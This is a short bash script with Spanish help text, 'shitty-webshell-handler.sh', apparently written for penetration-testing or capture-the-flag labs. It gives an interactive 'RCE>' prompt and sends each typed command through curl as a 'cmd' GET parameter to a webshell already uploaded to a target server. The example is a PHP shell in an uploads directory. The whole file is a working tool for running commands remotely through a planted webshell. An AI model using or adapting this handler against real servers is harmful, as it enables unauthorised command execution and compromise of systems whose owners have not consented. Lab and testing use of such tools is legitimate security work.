#!/bin/bash

RED="\e[31m"
BLUE="\e[34m"
MAGENTA="\e[35m"
ENDCOLOR="\e[0m"

function help() {
    echo ""

    echo -e "${BLUE}shitty-webshell-handler.sh${ENDCOLOR} - Controla webshells enviando solicitudes ${MAGENTA}GET${ENDCOLOR} usando ${MAGENTA}curl${ENDCOLOR}."

    echo ""

    echo -e "Sintaxis:"
    echo -e "\t${BLUE}shitty-webshell-handler.sh${ENDCOLOR} ${MAGENTA}URL${ENDCOLOR}"

    echo ""

    echo -e "Descripcion:"
    echo -e "\tControla webshells de forma similar a una reverse shell. Salir con ${MAGENTA}exit${ENDCOLOR}."
    echo -e "\tFunciona con un bucle infinito que envia solicitudes ${MAGENTA}GET${ENDCOLOR} usando ${MAGENTA}curl${ENDCOLOR}."
    echo -e "\tEl comando se envia a traves del parametro ${MAGENTA}cmd${ENDCOLOR}."

    echo ""

    echo -e "Ejemplo:"
    echo -e "\t${BLUE}shitty-webshell-handler.sh${ENDCOLOR} 'http://10.10.11.34/uploads/shell.php'"

    exit 0
}

function error() {
    echo -e "\n${RED}[x]${ENDCOLOR} Error! $1"
    exit 1
}

if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]] || [[ "$2" == "-h" ]] || [[ "$2" == "--help" ]]; then
    help
fi

if [[ "$#" -ne 1 ]]; then
    error "No hay URL"
fi

while true; do
    echo -ne "${RED}RCE>${ENDCOLOR} "
    read -r cmd

    if [[ "$cmd" == "exit" ]]; then
        exit 0
    fi

    curl -q -G "$1" --data-urlencode "cmd=${cmd}"
done
